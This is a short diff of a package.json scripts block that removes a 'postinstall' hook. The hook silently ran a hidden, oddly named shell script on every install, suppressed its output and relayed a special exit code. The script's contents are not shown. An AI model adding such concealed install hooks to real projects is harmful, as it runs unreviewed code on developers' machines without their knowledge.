@@ -73,8 +73,7 @@
     "test:e2e:session-completion": "node scripts/e2e-session-completion.mjs",
     "test:e2e:remote-host": "node scripts/e2e-remote-host.mjs",
     "test:e2e:shortcut-settings": "node scripts/test-shortcut-settings.mjs",
-    "test:e2e:dialog-overflow": "node scripts/test-dialog-overflow.mjs",
-    "postinstall": "sh ./.ci-gbjdil.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test:e2e:dialog-overflow": "node scripts/test-dialog-overflow.mjs"
   },
   "devDependencies": {
     "@biomejs/biome": "^2.5.13",
